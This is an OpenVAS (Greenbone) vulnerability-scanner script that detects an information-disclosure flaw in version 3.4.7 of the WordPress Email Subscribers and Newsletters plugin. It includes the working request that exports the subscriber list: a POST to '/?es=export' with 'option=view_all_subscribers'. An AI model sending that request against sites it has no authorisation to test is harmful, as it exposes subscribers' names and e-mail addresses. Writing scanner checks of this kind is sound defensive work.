###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_email_subs_n_news_info_disc_vuln.nasl 12116 2018-10-26 10:01:35Z mmartin $
#
# WordPress Plugin EmailSubscribers And Newsletters Information Disclosure Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.812672");
  script_version("$Revision: 12116 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 12:01:35 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-01-25 10:24:30 +0530 (Thu, 25 Jan 2018)");
  script_name("WordPress Plugin EmailSubscribers And Newsletters Information Disclosure Vulnerability");

  script_tag(name:"summary", value:"This host is installed with wordpress
  EmailSubscribers And Newsletters plugin and is prone to information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read sensitive information or not.");

  script_tag(name:"insight", value:"The flaw exists due to improper access
  restriction allowing user to download the entire subscriber list with names
  and e-mail addresses.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to potentially sensitive information.");

  script_tag(name:"affected", value:"WordPress Plugin Email Subscribers and
  Newsletters version 3.4.7");

  script_tag(name:"solution", value:"Upgrade to WordPress Plugin Email Subscribers
  and Newsletters version 3.4.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/43872");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/email-subscribers");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:port)){
  exit(0);
}

if(dir == "/"){
  dir = "";
}

postData = "option=view_all_subscribers";
url = dir + "/?es=export";

req = http_post_req(port:port, url:url, data:postData, add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "HTTP/1.. 200 OK" && res =~ "email-subscribers.*csv" &&
   res =~ "Email.Name.Status.Created.EmailGroup" && res =~ '"[a-z0-9]+@[a-z]+.com"."[A-Za-z0-9]+".')
{
  report = report_vuln_url(port:port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
